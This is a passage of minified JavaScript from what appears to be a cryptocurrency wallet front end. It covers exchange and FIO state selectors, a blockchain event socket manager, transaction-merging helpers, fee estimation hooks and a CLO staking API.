        _t.P1)([exchangeStateSelector, isAllBalanceUpdating], ( (e, t) => !0 === t ? [] : e.tokens || []))
          , Wi = (0,
        _t.P1)([exchangeStateSelector, isAllBalanceUpdating], ( (e, t) => {
            if (!0 === t)
                return {};
            const a = {}
              , n = undefined;
            e.tokens.forEach((e => {
                if (e.contract) {
                    const t = `${e.family}:${e.contract}`.toLocaleLowerCase();
                    a[t] = e
                }
            }
            ));
            return a
        }
        ))
          , Ri = (0,
        _t.P1)(exchangeStateSelector, (e => e.exchangeTransaction || null))
          , Bi = (0,
        _t.P1)(exchangeStateSelector, (e => e.isFailedFetchEstimate))
          , Oi = (0,
        _t.P1)(exchangeStateSelector, (e => e.exchangeError))
          , Di = (0,
        _t.P1)(exchangeStateSelector, (e => e.dustInvoiceId))
          , Mi = (0,
        _t.P1)(exchangeStateSelector, (e => e.isApplyableForDustRequest))
          , Ui = (0,
        _t.P1)(exchangeStateSelector, (e => e.mainPageStep))
          , Gi = (0,
        _t.P1)(exchangeStateSelector, (e => e.walletFrom))
          , Vi = (0,
        _t.P1)(exchangeStateSelector, (e => e.walletTo))
          , Ki = (0,
        _t.P1)(exchangeStateSelector, (e => e.exchangeStatusHistory))
          , Hi = (0,
        _t.P1)(exchangeStateSelector, (e => e.isFetchingExchangeUpdateTx))
          , zi = (0,
        _t.P1)(exchangeStateSelector, (e => e.sendAssetsResponse))
          , ji = (0,
        _t.P1)(exchangeStateSelector, (e => e.exchangeAssetsList))
          , $i = (0,
        _t.P1)(exchangeStateSelector, (e => e.exchangeInfo))
          , Zi = (0,
        _t.P1)(exchangeStateSelector, (e => e.orderInfo))
          , Yi = (0,
        _t.P1)(exchangeStateSelector, (e => e.totalGethBalance))
          , qi = (0,
        _t.P1)(exchangeStateSelector, (e => e.amount));
        var Xi = a(86535)
          , Qi = a(99244)
          , Ji = a(74326)
          , eo = a(82499)
          , to = a(69509);
        function socket_manager_defineProperty(e, t, a) {
            (t = socket_manager_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function socket_manager_toPropertyKey(e) {
            var t = socket_manager_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function socket_manager_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        let ao = [];
        class SocketManager {
            constructor() {
                socket_manager_defineProperty(this, "socket", void 0);
                socket_manager_defineProperty(this, "isLoggedOut", !1);
                socket_manager_defineProperty(this, "walletsAccessor", ( () => []));
                socket_manager_defineProperty(this, "newVersionAvailableHandler", ( () => {}
                ));
                socket_manager_defineProperty(this, "setWalletsAccessor", (e => {
                    let {walletsAccessor: t} = e;
                    this.walletsAccessor = t;
                    return this
                }
                ));
                socket_manager_defineProperty(this, "setNewVersionEventHandler", (e => {
                    e && (this.newVersionAvailableHandler = e)
                }
                ));
                socket_manager_defineProperty(this, "_isConnectionExists", ( () => this.socket && this.socket.readyState));
                socket_manager_defineProperty(this, "disconnect", (e => {
                    if (this.socket) {
                        this.socket.close();
                        this.socket = void 0
                    }
                    if ("logout" === e) {
                        this.isLoggedOut = !0;
                        this.connect()
                    } else
                        this.isLoggedOut = !1
                }
                ));
                socket_manager_defineProperty(this, "isCurrencySupported", (e => ao.includes(e)));
                socket_manager_defineProperty(this, "isNeedToUpdateWalletBalanceByRest", (e => !0 !== e.isSocketUniqInstance || !e.wasUpdatedBalancesByRest()));
                socket_manager_defineProperty(this, "isNeedToUpdateWalletTxsByRest", (e => !0 !== e.isSocketUniqInstance || !e.wasUpdatedTxsByRest()));
                socket_manager_defineProperty(this, "_onConnectEvent", (e => {
                    var t;
                    ao = Object.keys(e.heights);
                    const a = this.walletsAccessor().filter((e => !e.isSocketUniqInstance));
                    let n = {};
                    a.forEach((e => {
                        !this.isLoggedOut && this.isCurrencySupported(e.currency) && e.compileSocketManagerSubscrParams && (n = Object.assign(n, e.compileSocketManagerSubscrParams()))
                    }
                    ));
                    let r = localStorage.getItem("hovard-uuid");
                    if (!r) {
                        r = (0,
                        he.Z)();
                        localStorage.setItem("hovard-uuid", r)
                    }
                    const l = "blocks, txs, refresh, clearCache, newVersionAvailable, underAttack"
                      , s = "refresh, clearCache, newVersionAvailable, underAttack";
                    null === (t = this.socket) || void 0 === t || t.send(JSON.stringify({
                        method: "subscribe",
                        events: this.isLoggedOut ? s : l,
                        uuid: r,
                        data: n
                    }))
                }
                ));
                socket_manager_defineProperty(this, "_onTxEvent", (e => {
                    const {subscriberAddress: t, tx: a} = e
                      , n = this.walletsAccessor().find((e => e.isTxRalatesTo(t, a)));
                    n && n.handleSocketIncomingTx && n.handleSocketIncomingTx({
                        tx: a
                    })
                }
                ));
                socket_manager_defineProperty(this, "_onBlockEvent", (e => {
                    const t = this.walletsAccessor().find((t => t.currency === e.currency));
                    t && t.incrementTxsConfirmations()
                }
                ));
                socket_manager_defineProperty(this, "_onConfirmEvent", (e => {
                    const {subscriberAddress: t, tx: a} = e
                      , n = this.walletsAccessor().find((e => e.isTxRalatesTo(t, a)));
                    n && n.handleSocketIncomingTxConfirmation && n.handleSocketIncomingTxConfirmation({
                        tx: a
                    })
                }
                ));
                socket_manager_defineProperty(this, "_onClearCache", ( () => {}
                ));
                socket_manager_defineProperty(this, "_onNewVersionAvailable", ( () => {
                    this.newVersionAvailableHandler && this.newVersionAvailableHandler()
                }
                ));
                socket_manager_defineProperty(this, "connect", (async () => {}
                ))
            }
        }
        const no = undefined
          , ro = new SocketManager;
        var lo = a(88921)
          , so = a(96248)
          , io = a(13599)
          , oo = a(11477)
          , co = a(64362)
          , uo = a(15389)
          , mo = a(90401)
          , po = a(45164)
          , fo = a(91238)
          , Eo = a(54837)
          , ho = a(87485)
          , yo = a(56767)
          , vo = a(76651)
          , _o = a(61437)
          , wo = a(35285)
          , bo = a(39865);
        const ko = (0,
        te.createAction)("@fio/addresses/SET_PENDING_ACCOUNTS")()
          , So = (0,
        te.createAction)("@fio/addresses/SET_FIO_ACCOUNT")()
          , Co = (0,
        te.createAction)("@fio/addresses/SET_FIO_WALLETS")()
          , No = (0,
        te.createAction)("@fio/addresses/CLEAR_FIO_DATA")()
          , To = "@fio/addresses"
          , fioAddressesStateSelector = e => e["@fio/addresses"]
          , Ao = (0,
        _t.P1)(fioAddressesStateSelector, (e => e.fioAddressesData || {}))
          , xo = (0,
        _t.P1)(fioAddressesStateSelector, (e => e.accounts || []))
          , Io = (0,
        _t.P1)(fioAddressesStateSelector, (e => e.pendingAccounts || {}))
          , Po = (0,
        _t.P1)(Ao, (e => t => t && e[t] || {}))
          , Lo = (0,
        _t.P1)(Ao, (e => t => {
            if (!t)
                return null;
            const a = Object.keys(e);
            let n = null;
            a.forEach((a => {
                const r = undefined;
                Object.keys(e[a]).forEach((r => {
                    e[a][r].toLowerCase() === t.toLowerCase() && (n = a)
                }
                ))
            }
            ));
            return n
        }
        ))
          , Fo = "wallet-updater"
          , selectWalletUpdater = e => e[Fo]
          , Wo = (0,
        _t.P1)(selectWalletUpdater, (e => e.updateInformation || {}))
          , Ro = (0,
        _t.P1)(selectWalletUpdater, (e => e.isBackupInitialized))
          , Bo = (0,
        _t.P1)(selectWalletUpdater, (e => e.isAllBalanceUpdating));
        var Oo = a(85827)
          , Do = a(25387)
          , Mo = a(72608)
          , Uo = a(64211)
          , Go = a(41874)
          , Vo = a(58752);
        const merge_exchange_tx = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            const a = t.reduce(( (e, t) => {
                e.push(t.payinHash, t.id, t.payoutHash);
                return e
            }
            ), [])
              , n = e.filter((e => {
                const n = e.id && a.indexOf(e.id) > -1
                  , r = undefined;
                if (e.hash && a.indexOf(e.hash) > -1 || "exchange" === e.type && n) {
                    const a = t.find((t => e.hash === t.payinHash || e.hash === t.payoutHash));
                    if (a && "exchange" !== e.type) {
                        e.isIncoming ? a.toFamily || (a.toFamily = e.family || e.currencyTo) : a.fromFamily || (a.fromFamily = e.family || e.currencyFrom);
                        a.fee || (a.fee = e.fee)
                    }
                    return !1
                }
                return !0
            }
            ));
            t.filter((e => e.payinHash)).forEach((e => {
                var t, a;
                const r = (0,
                Vo.v)({
                    type: "exchange",
                    isIncoming: !1,
                    confirmations: 1,
                    hash: e.payinHash,
                    exchangeId: e.exchangeId,
                    partnerId: e.id,
                    currencyFrom: null === (t = e.fromCurrency) || void 0 === t ? void 0 : t.toLowerCase(),
                    currencyTo: null === (a = e.toCurrency) || void 0 === a ? void 0 : a.toLowerCase(),
                    addressFrom: e.fromAddress,
                    addressTo: e.payoutAddress,
                    amount: e.amountSend,
                    fee: e.fee,
                    timestamp: new Date(e.updatedAt).getTime(),
                    extra: {
                        familyFrom: e.fromFamily,
                        familyTo: e.toFamily,
                        amountTo: e.amountReceive,
                        amountFrom: e.amountSend,
                        hashFrom: e.payinHash,
                        hashTo: e.payoutHash,
                        status: e.status,
                        dustInvoiceId: e.dustInvoiceId,
                        amountReceiveInitial: e.amountReceiveInitial
                    }
                });
                n.push(r)
            }
            ));
            return n
        }
          , merge_multisigs = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            e = e.filter((e => {
                var t, a;
                return !(null !== (t = e.extra) && void 0 !== t && null !== (a = t.data) && void 0 !== a && a.includes("0x095ea7b3"))
            }
            ));
            const a = t.map((t => {
                var a;
                let n = {};
                const r = t.transactionId || t.multisigId;
                e = e.filter((e => e.uniqKey !== r));
                const l = t.multisigId && t.transactionId ? "multisig-txs" : "multisig"
                  , s = null === (a = t.states) || void 0 === a ? void 0 : a.find((e => e.transactionHash))
                  , i = s ? s.transactionHash : null
                  , o = t.transactionHash || i;
                if (o) {
                    n = e.find((e => e.hash === o)) || {};
                    e = e.filter((e => e.hash !== o));
                    n.transactionId && (e = e.filter((e => e.transactionId !== n.transactionId || void 0 !== e.hash)))
                }
                const c = {
                    type: l,
                    uniqKey: r,
                    confirmations: n.confirmations,
                    timestamp: new Date(t.createdAt || t.txCreatedAt || "").getTime(),
                    original: JSON.parse(JSON.stringify(n)) || {},
                    ...t
                };
                delete c.privateKey;
                return (0,
                Vo.v)(c)
            }
            ));
            return a.concat(e).sort(( (e, t) => e.timestamp < t.timestamp ? 1 : -1))
        }
          , merge_fio = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            const a = []
              , n = {};
            for (const e of t) {
                if (n[String(e.fio_request_id) + String(e.isIncoming)])
                    continue;
                const a = t.filter((t => t.fio_request_id === e.fio_request_id && e.isIncoming === t.isIncoming));
                n[String(e.fio_request_id) + String(e.isIncoming)] = a
            }
            Object.keys(n).map((e => {
                let t;
                t = n[e].find((e => "fio-appruved" === e.type));
                if (t)
                    a.push(t);
                else {
                    t = n[e].find((e => "send_to_blockchain" === e.status));
                    if (t)
                        a.push(t);
                    else {
                        t = n[e].find((e => "rejected" === e.status));
                        if (t)
                            a.push(t);
                        else {
                            t = n[e].find((e => "requested" === e.status));
                            if (t)
                                a.push(t);
                            else {
                                t = n[e].find((e => "fio-pending" === e.type));
                                t && a.push(t)
                            }
                        }
                    }
                }
            }
            ));
            const r = new Date
              , l = r.getTimezoneOffset()
              , s = a.map((e => (0,
            Vo.v)({
                uniqKey: `${e.payer_fio_address}${e.payee_fio_address}${e.fio_request_id}${e.isIncoming}`,
                timestamp: new Date(e.time_stamp).getTime() - 60 * l * 1e3,
                amount: "string" == typeof e.content ? void 0 : e.content.amount,
                currencyTo: "string" == typeof e.content ? void 0 : e.content.token_code,
                currencyFrom: "string" == typeof e.content ? void 0 : e.content.token_code,
                hash: ("string" == typeof e.content ? void 0 : e.content.obtId) || ("string" == typeof e.content ? void 0 : e.content.hash),
                addressTo: "string" == typeof e.content ? void 0 : e.content.payee_public_address,
                isIncoming: e.isIncoming,
                status: e.status,
                type: e.type,
                original: e
            })));
            return s.concat(e).sort(( (e, t) => e.timestamp < t.timestamp ? 1 : -1))
        };
        var Ko = a(67048)
          , Ho = a(87205);
        function transactionTimestampSorter(e, t) {
            return e.timestamp - t.timestamp
        }
        const zo = 15
          , isInPercentRange = (e, t) => {
            const a = (0,
            Ko.h9)(e, (0,
            Ko.hC)((0,
            Ko.$q)(e, zo), 100))
              , n = (0,
            Ko.PD)(e, (0,
            Ko.hC)((0,
            Ko.$q)(e, zo), 100));
            return (0,
            Ko.eg)(t, a) && (0,
            Ko.G)(t, n)
        }
          , jo = 864e5
          , isInDateRange = (e, t) => {
            const a = new Date(t).getTime();
            return +e > +a && +a + jo > +e
        }
        ;
        function getBuyTransactionTimestampRange(e) {
            const t = new Date(e.timestamp).getTime();
            return [t, t + jo]
        }
        const mergerTxs = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : []
              , a = arguments.length > 2 ? arguments[2] : void 0
              , n = arguments.length > 3 ? arguments[3] : void 0;
            const r = []
              , l = [];
            e.forEach((e => {
                var s;
                const i = e;
                t.forEach((t => {
                    if (n(e, t)) {
                        i.type = a;
                        i.extra = t;
                        t.hash && Object.assign(i, t);
                        t.timestamp && (i.timestamp = new Date(t.timestamp).getTime());
                        l.push(t.paymentId)
                    }
                }
                ));
                if (e.paymentId || null !== (s = e.extra) && void 0 !== s && s.paymentId) {
                    var o;
                    l.push(e.paymentId || (null === (o = e.extra) || void 0 === o ? void 0 : o.paymentId))
                }
                r.push(i)
            }
            ));
            const s = t.filter((e => !l.includes(e.paymentId)));
            s.forEach((e => {
                if (e.timestamp) {
                    const t = {
                        ...e,
                        timestamp: new Date(e.timestamp).getTime()
                    };
                    t.type = a;
                    t.extra = {
                        ...e
                    };
                    r.push((0,
                    Vo.v)(t))
                }
            }
            ));
            r.sort(transactionTimestampSorter);
            return r
        }
          , mergeSellTxs = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            return mergerTxs(e, t, "sell", ( (e, t) => {
                var a, n, r, l;
                const s = (0,
                Ho.t)(e.currencyTo) === (0,
                Ho.t)(t.currencyFrom)
                  , i = (0,
                Ho.t)(null !== (a = e.addressFrom) && void 0 !== a ? a : "") === (0,
                Ho.t)(t.addressFrom)
                  , o = (0,
                Ho.t)(null !== (n = e.hash) && void 0 !== n ? n : "") === (0,
                Ho.t)(t.hash)
                  , c = null !== (r = e.extra) && void 0 !== r && r.paymentId ? (0,
                Ho.t)(null === (l = e.extra) || void 0 === l ? void 0 : l.paymentId) === (0,
                Ho.t)(t.paymentId) : null;
                return !(!e.paymentId || !t.paymentId || e.paymentId !== t.paymentId) || Boolean(!e.isIncoming && s && i && (o || c))
            }
            ))
        }
          , legacyMergeBuyTxs = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            return mergerTxs(e, t, "buy", ( (e, t) => {
                var a;
                const n = toLower(e.currencyTo) === toLower(t.currencyTo)
                  , r = toLower(null !== (a = e.addressTo) && void 0 !== a ? a : void 0) === toLower(t.address);
                return !(!e.paymentId || !t.paymentId || e.paymentId !== t.paymentId) || Boolean(e.isIncoming && n && isInPercentRange(e.amount, t.amountTo) && r && isInDateRange(e.timestamp, t.timestamp))
            }
            ))
        };
        function getPaymentId(e) {
            var t, a;
            return null !== (t = e.paymentId) && void 0 !== t ? t : null === (a = e.extra) || void 0 === a ? void 0 : a.paymentId
        }
        function buyTransactionTimestampSorter(e, t) {
            const a = new Date(e.timestamp)
              , n = new Date(t.timestamp);
            return a.valueOf() - n.valueOf()
        }
        function findFirstTransactionIndexWithTimestampGreaterThanOrEqual(e, t) {
            let a = 0, n = e.length, r;
            for (; a !== n; ) {
                var l, s;
                const i = Math.floor((n + a) / 2);
                if (i === r)
                    break;
                const o = null === (l = e[i - 1]) || void 0 === l ? void 0 : l.timestamp
                  , c = undefined;
                if ((null === (s = e[i]) || void 0 === s ? void 0 : s.timestamp) >= t) {
                    if (void 0 === o || o < t)
                        return i;
                    n = i
                } else
                    a = i;
                r = i
            }
        }
        const mergeBuyTransactions = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            e.sort(transactionTimestampSorter);
            t.sort(buyTransactionTimestampSorter);
            const a = []
              , n = new Set
              , r = new Map;
            for (const t of e) {
                const e = getPaymentId(t);
                e && r.set(e, t)
            }
            for (const i of t) {
                if (!i.paymentId)
                    continue;
                if (!i.timestamp)
                    continue;
                let t = r.get(i.paymentId);
                if (!t) {
                    var l;
                    const [a,n] = getBuyTransactionTimestampRange(i)
                      , r = findFirstTransactionIndexWithTimestampGreaterThanOrEqual(e, a)
                      , o = null !== (l = findFirstTransactionIndexWithTimestampGreaterThanOrEqual(e, n)) && void 0 !== l ? l : e.length - 1;
                    if (void 0 !== r)
                        for (let l = r; l <= o; l += 1) {
                            var s;
                            const r = e[l]
                              , o = undefined;
                            if (Boolean(r.isIncoming && (0,
                            Ho.t)(r.currencyTo) === (0,
                            Ho.t)(i.currencyTo) && (0,
                            Ho.t)(null !== (s = r.addressTo) && void 0 !== s ? s : void 0) === (0,
                            Ho.t)(i.address) && r.timestamp >= a && r.timestamp <= n && isInPercentRange(r.amount, i.amountTo))) {
                                t = r;
                                break
                            }
                        }
                }
                if (t) {
                    n.add(t.primaryKey);
                    t = {
                        ...t,
                        type: "buy",
                        extra: i
                    };
                    i.hash && Object.assign(t, i);
                    i.timestamp && (t.timestamp = new Date(i.timestamp).getTime());
                    t = (0,
                    Vo.v)(t);
                    r.set(i.paymentId, t);
                    n.add(t.primaryKey);
                    a.push(t)
                } else {
                    const e = (0,
                    Vo.v)({
                        ...i,
                        timestamp: new Date(i.timestamp).getTime(),
                        type: "buy",
                        extra: i
                    });
                    n.add(e.primaryKey);
                    a.push(e)
                }
            }
            for (const t of e)
                if (!n.has(t.primaryKey)) {
                    n.add(t.primaryKey);
                    a.push(t)
                }
            a.sort(transactionTimestampSorter);
            return a
        }
          , filterMintingEthTxs = e => {
            const t = new Map
              , a = undefined;
            return e.filter((e => {
                if ("eth" !== e.family && "ropsten" !== e.family)
                    return !0;
                if ("0x0000000000000000000000000000000000000000" === e.addressFrom) {
                    t.set(e.hash, e);
                    return !1
                }
                return !t.has(e.hash)
            }
            )).concat([...t.values()])
        }
        ;
        var $o = a(28599)
          , Zo = a.n($o);
        const fee_wallet = e => {
            const t = (0,
            $.v9)(lu);
            return (0,
            O.useMemo)(( () => {
                if (!e)
                    return [null];
                if (e.multisigId)
                    return [e];
                const a = Se.Z.getMetadataByWallet(e);
                if (!a || null == a || !a.feePath)
                    return [e];
                const {feePath: n} = a
                  , r = t(e.uuid);
                if ("parent" === n) {
                    if (r)
                        return [r];
                    console.warn('No parent wallet found for wallet with `feePath === "parent"`', e, r, n)
                }
                if ("parent" !== n && "sub" === n.path) {
                    const t = undefined
                      , a = undefined;
                    return [(r || e).subWallets.find((e => e.currency === n.currency)) || null]
                }
                return [e]
            }
            ), [e])
        }
          , Yo = "0x65219a0c44f518110f483727920a3b9d7eb588537be52657eb913b495145fb56"
          , fetchFee = async e => {
            var t;
            let {fromWallet: a, toWallet: n, feeWallet: r, amount: l, additionalSend: s, type: i} = e, o;
            if ((null == r ? void 0 : r.type) === we.uQ.BTC_LIKE_SEGWIT_WALLET) {
                var c;
                o = (null !== (c = null == a ? void 0 : a.subWallets) && void 0 !== c ? c : []).map((e => e.address))
            } else
                null != a && a.address && (o = a.address);
            const u = r ? Se.Z.getMetadataByWallet(r) : null;
            if (null != s && s.isExchange && null != u && null !== (t = u.sampleParameters) && void 0 !== t && t.extraId) {
                var d;
                Object.assign(s, {
                    extraId: null == u || null === (d = u.sampleParameters) || void 0 === d ? void 0 : d.extraId
                })
            }
            null != s && s.feePerByte && Object.assign(s, {
                feePerByte: parseInt(String(s.feePerByte), 10)
            });
            if (!r)
                return {};
            const m = await Se.Z.getApiByWallet(r);
            if (!m)
                return {};
            let p = "apt" === (null == a ? void 0 : a.currency) ? Yo : o;
            "sol" === (null == a ? void 0 : a.family) && (p = null == n ? void 0 : n.address);
            const f = await m.getFee({
                addressTo: n && (null == a ? void 0 : a.currency) === n.currency ? n.address : p,
                amount: l || 1,
                addressFrom: o,
                ...s,
                currency: null == a ? void 0 : a.currency,
                fromWallet: a,
                privateKey: null == a ? void 0 : a.privateKey,
                type: i,
                smartContract: null == a ? void 0 : a.smartContract
            });
            if (f.error)
                throw f;
            return 0 === (null == f ? void 0 : f.fee) ? {
                fee: "0"
            } : f
        }
          , use_fee = function(e, t, a) {
            let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {}
              , r = arguments.length > 4 ? arguments[4] : void 0;
            const [l,s] = (0,
            O.useState)(null)
              , [i,o] = (0,
            O.useState)("")
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(!1)
              , [p] = fee_wallet(e)
              , [f,E] = (0,
            O.useState)(null)
              , h = (0,
            O.useRef)(!1)
              , g = (0,
            O.useMemo)((async () => {
                if ("exchange" === r && "sol" === (null == e ? void 0 : e.family)) {
                    const t = await Se.Z.getApiByCurrency(e.family)
                      , a = undefined;
                    return await t.createWallet()
                }
                return t
            }
            ), [t, e])
              , y = throttle((async function() {
                let {abortSignal: l} = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                const i = setTimeout((async () => {
                    if (l && l.aborted)
                        return;
                    if (!p) {
                        "exchange" === r && m(!1);
                        return
                    }
                    if (!("exchange" !== r && "send" !== r || t || a))
                        return;
                    s(null);
                    E(null);
                    u(!1);
                    m(!0);
                    const i = {
                        ...n,
                        ..."exchange" === r && "sol" === (null == e ? void 0 : e.family) && null != e && e.smartContract ? {
                            isPriorityFee: !0
                        } : {}
                    };
                    try {
                        const {fee: t, resource: n, gasPrice: c, gasLimit: u, feePerByte: d, extraFee: f} = await fetchFee({
                            fromWallet: e,
                            toWallet: await g,
                            feeWallet: p,
                            amount: a,
                            additionalSend: i,
                            type: r
                        });
                        if (l && l.aborted)
                            return;
                        o(n || "");
                        s(null != t ? t : null);
                        E(c && u ? {
                            gasPrice: c,
                            gasLimit: u,
                            extraFee: f
                        } : d ? {
                            feePerByte: d,
                            extraFee: f
                        } : f ? {
                            extraFee: f
                        } : null)
                    } catch (n) {
                        if ("exchange" === r && !1 === h.current) {
                            ge.b.error(ge.d.EXCHANGE_CALCULATE_FEE_ERROR, {
                                familyFrom: null == e ? void 0 : e.family,
                                currencyFrom: null == e ? void 0 : e.currency,
                                addressFrom: null == e ? void 0 : e.address,
                                familyTo: null == t ? void 0 : t.family,
                                currencyTo: null == t ? void 0 : t.currency,
                                addressTo: null == t ? void 0 : t.address,
                                amount: a
                            }, n);
                            h.current = !0
                        }
                        u(!0)
                    } finally {
                        m(!1)
                    }
                }
                ), 700);
                return () => clearTimeout(i)
            }
            ));
            (0,
            O.useEffect)(( () => {
                const e = new (Zo());
                "exchange" === r && m(!0);
                y({
                    abortSignal: e.signal
                });
                return () => {
                    e.abort()
                }
            }
            ), [e && e.uuid, p && p.uuid, t && t.address, a, n.gasPrice, n.gasLimit, n.feePerByte]);
            return [l, c, d, y, f, i]
        }
          , qo = "0xd813419749b3c2cdc94a2f9cfcf154113264a9d6"
          , Xo = "0x08A7c8be47773546DC5E173d67B0c38AfFfa4b84"
          , Qo = 2e5
          , Jo = {
            address: Xo,
            currency: "clo",
            uuid: "dummy_staking_clo_to_wallet"
        }
          , transformErrorMessage = e => "Returned error: insufficient funds for gas * price + value" === e.message ? "Not enough funds to pay network fee. Top up your wallet." : "Failed to to send claim transaction";
        class StakingCloApi {
            async info(e) {
                const {address: t, currency: a} = e;
                try {
                    z()(a, "Expected `currency` in WalletMeta");
                    const e = await Se.Z.getApiByCurrency(a)
                      , n = undefined;
                    return await e.getStakingInfo(t)
                } catch (e) {
                    return {
                        amount: 0
                    }
                }
            }
            async claim(e) {
                let {wallet: {address: t, privateKey: a, currency: n, uuid: r}, contractAddress: l} = e;
                try {
                    const e = await Se.Z.getApiByCurrency("clo");
                    await e.claim(t, a, l);
                    return {
                        address: t,
                        currency: n,
                        uuid: r
                    }
                } catch (e) {
                    throw Error(transformErrorMessage(e))
                }
            }
            async withdraw(e) {
                let {wallet: {address: t, privateKey: a, currency: n, uuid: r}, contractAddress: l} = e;
                try {
                    const e = await Se.Z.getApiByCurrency("clo");
                    await e.withdraw(t, a, l);
                    return {
                        address: t,
                        currency: n,
                        uuid: r
                    }
                } catch (e) {
                    throw Error(transformErrorMessage(e))
                }
            }
            async claimTxFee(e) {
                z()(e.currency, "Expected `currency` in WalletMeta");
                const t = undefined;
                return (await Se.Z.getApiByCurrency(e.currency)).getClaimTxFee()
            }
            async fetchGasPrice(e) {
                let {currency: t} = e;
                const a = undefined;
                return (await Se.Z.getApiByCurrency(t)).getGasPrice()
            }
            async fetchFee(e) {
                let {fromWallet: t, amount: a, additionalSend: n} = e;
                return fetchFee({
                    fromWallet: t,
                    toWallet: Jo,
                    feeWallet: t,
                    amount: a,
                    additionalSend: n
                })
            }
            async sendStakingTx(e) {
                let {fromWallet: t, params: a} = e;
                Object.assign(a, {
                    gasLimit: Qo
                });
                const n = await Se.Z.getApiByCurrency(t.currency)
                  , r = undefined;
                return await n.sendStakingTransaction({
                    fromWallet: t,
                    params: a
                })
            }
        }
        const ec = new StakingCloApi;
        let tc, ac, nc;
        !function(e) {
            e.WATING_FOR_DEPOSIT = "waiting_for_deposit";
            e.WATING_FOR_RISK_CONTROL = "waiting_for_risk_control";
            e.EXCHANGING = "exchanging";
            e.SENDING = "sending";
            e.FINISHED = "finished";
            e.FAILED = "failed";
            e.CANCELLED = "cancelled";
            e.EXPIRED = "expired";
            e.REFUNDED = "refunded"
        }(tc || (tc = {}));
        !function(e) {
            e.SUBMITTED = "payment_request_submitted";
            e.APPRUVED = "payment_simplexcc_approved";
            e.DECLINED = "payment_simplexcc_declined";
            e.REFUNDED = "payment_simplexcc_refunded"
        }(ac || (ac = {}));
        !function(e) {
            e.WATING_YOUR_DEPOSIT = "WATING_YOUR_DEPOSIT";
            e.WATING_YOUR_KYC = "WATING_YOUR_KYC";
            e.WATING_BANK_EXCHANGING = "WATING_BANK_EXCHANGING";
            e.WATING_BANK_SENDING = "WATING_BANK_SENDING";
            e.REQUEST_SUBMITTED = "REQUEST_SUBMITTED";
            e.BANK_ACCEPTED = "BANK_ACCEPTED";
            e.FINISHED = "FINISHED";
            e.FAILED = "FAILED";
            e.CANCELED = "CANCELED";
            e.EXPIRED = "EXPIRED";
            e.REFUNDED = "REFUNDED"
        }(nc || (nc = {}));
        const rc = {
            [tc.WATING_FOR_DEPOSIT]: nc.WATING_YOUR_DEPOSIT,
            [tc.WATING_FOR_RISK_CONTROL]: nc.WATING_YOUR_KYC,
            [tc.EXCHANGING]: nc.WATING_BANK_EXCHANGING,
            [tc.SENDING]: nc.WATING_BANK_SENDING,
            [tc.FINISHED]: nc.FINISHED,
            [tc.FAILED]: nc.FAILED,
            [tc.CANCELLED]: nc.CANCELED,
            [tc.EXPIRED]: nc.EXPIRED,
            [tc.REFUNDED]: nc.REFUNDED,
            [ac.SUBMITTED]: nc.REQUEST_SUBMITTED,
            [ac.APPRUVED]: nc.BANK_ACCEPTED,
            [ac.DECLINED]: nc.FAILED,
            [ac.REFUNDED]: nc.REFUNDED
        }
          , toBuyStatus = e => e ? rc[e] : void 0
          , lc = [tc.FAILED, tc.CANCELLED, tc.EXPIRED, tc.REFUNDED, ac.DECLINED, ac.REFUNDED]
          , isBuyErrorStatus = e => !!e && lc.includes(e)
          , sc = [tc.WATING_FOR_DEPOSIT, tc.WATING_FOR_RISK_CONTROL, tc.EXCHANGING, tc.SENDING]
          , isCheckDetailsStatus = e => !!e && sc.indexOf(e) > -1
          , ic = [tc.FINISHED, tc.EXPIRED]
          , isRepeatStatus = e => !!e && ic.indexOf(e) > -1
          , getExtra = e => null == e ? void 0 : e.extra
          , isXDCTokenTransfer = e => {
            var t;
            return "xdc" === e.family && "XDC_TOKEN_TRANSFER" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , isHbarTokenCreation = e => {
            var t;
            return "TOKENCREATION" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , isHbarTokenAssociate = e => {
            var t;
            return "TOKENASSOCIATE" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , isCloStaking = e => {
            var t, a, n;
            return e && (null !== (t = e.amount) && void 0 !== t ? t : 0) > 0 && ((null === (a = e.addressTo) || void 0 === a ? void 0 : a.toLowerCase()) === qo.toLowerCase() || (null === (n = e.addressTo) || void 0 === n ? void 0 : n.toLowerCase()) === Xo.toLowerCase())
        }
          , isCloStakingReward = e => {
            var t, a;
            return "0x4e71d92d" === (null === (t = getExtra(e)) || void 0 === t || null === (a = t.data) || void 0 === a ? void 0 : a.toLowerCase())
        }
          , isCloStakingWithdraw = e => {
            var t, a;
            return "0xcd948855" === (null === (t = getExtra(e)) || void 0 === t || null === (a = t.data) || void 0 === a ? void 0 : a.toLowerCase())
        }
          , isOneDelegate = e => {
            var t;
            return "delegate" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type) && "one" === e.currencyFrom
        }
          , isOneUnDelegate = e => {
            var t;
            return "undelegate" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type) && "one" === e.currencyFrom
        }
          , isOneReward = e => {
            var t;
            return "collectrewards" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type) && "one" === e.currencyFrom
        }
